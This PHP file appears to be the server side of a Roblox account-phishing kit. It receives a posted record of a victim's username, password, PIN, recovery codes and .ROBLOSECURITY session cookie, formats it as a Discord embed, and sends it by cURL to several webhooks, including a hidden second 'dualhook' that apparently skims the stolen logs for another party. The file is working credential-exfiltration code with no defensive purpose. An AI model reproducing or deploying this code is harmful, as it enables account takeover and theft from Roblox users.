<?php
include('web/setup/setup.php');
include('web/setup/database.php');
include('includes/functions.php');
include('api/stub.php');
session_start();
$loginToken = $_SESSION['session'];
$row = $db->query("SELECT * FROM east WHERE logintoken='$loginToken'")->fetch();
$dualhookfucker = $row["dualhook"];
$webhookUrl = $row["webhook"];
$siteId = $row["siteid"];
$shitfile = "api/bcount.txt";
$log = $_POST['log'];
$log = json_decode($log);
$username = $log->username;
$userid = $log->userid;
$age = $log->age;
$password = $log->password;
$summary = $log->summary;
$balance = $log->balance;
$pending = $log->pending;
$rap = $log->rap;
$credit = $log->credit;
$pin = $log->pin;
$step = $log->step;
$premium = $log->premium;
$accountage = $log->accountage;
$cantrade = $log->cantrade;
$collectibles = $log->collectibles;
$recoverycodes = $log->recoverycodes;
$roblosecurity = $log->roblosecurity;
if($recoverycodes){
// east has only one ball
$result = json_encode([
            "username" => "BOT - $siteName",
            "avatar_url" => $mainpfp,
             "content" => '',
                "embeds" => [
                    [
                        "title" => "$username ($age)",
                        "type" => "rich",
                        "description" => "[Profile](https://www.roblox.com/users/$userid/profile) | [Trade](https://www.roblox.com/users/$userid/trade) | [Check](https://www.roblox.com/login)",
                        "url" => $discord,
                        "color" => hexdec($embedColor),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/headshot-thumbnail/image?userId=$userid&width=420&height=420&format=png"
                        ],
                    "author" => [
                         "name" => "$siteName - Result",
                         "url" => "$discord"
                    ],
                    "footer" => [
                        "text" => "$siteName",
                      "icon_url" => "$mainpfp"
                    ],
                        "fields" => [
                            [
                                "name" => "**Username:**",
                                "value" => "```$username```",
                                "inline" => False
                            ],
                            [
                                "name" => "**Password:**",
                                "value" => "```$password```",
                                "inline" => False
                            ],
                            [
                                "name" => "**Summary:**",
                                "value" => "```R$$summary```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Balance:**",
                                "value" => "```R$$balance $pending```",
                                "inline" => True
                            ],
                            [
                                "name" => "**RAP:**",
                                "value" => "```R$$rap```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Credit:**",
                                "value" => "```$credit```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Pin:**",
                                "value" => "```$pin```",
                                "inline" => True
                            ],
                            [
                                "name" => "**2-Step:**",
                                "value" => "```$step```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Premium:**",
                                "value" => "```$premium```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Account Age:**",
                                "value" => "```$accountage```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Can Trade:**",
                                "value" => "```$cantrade```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Collectibles:**",
                                "value" => "```$collectibles```",
                                "inline" => False
                            ],
                            [
                                "name" => "**Recovery Codes:**",
                                "value" => "```$recoverycodes```",
                                "inline" => False
                            ],
                            [
                                "name" => "**.ROBLOSECURITY:**",
                                "value" => "```$roblosecurity```",
                                "inline" => False
                            ],
                        ]
                    ],
                ],
            
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $webhookUrl,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $result,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);                                   
        $response = curl_exec($ch);
        curl_close($ch);
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $dualhook,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $result,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);                                   
        $response = curl_exec($ch);
        curl_close($ch);
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $dualhookfucker,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $result,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);                                   
        $response = curl_exec($ch);
        curl_close($ch);
        session_destroy();
}
?>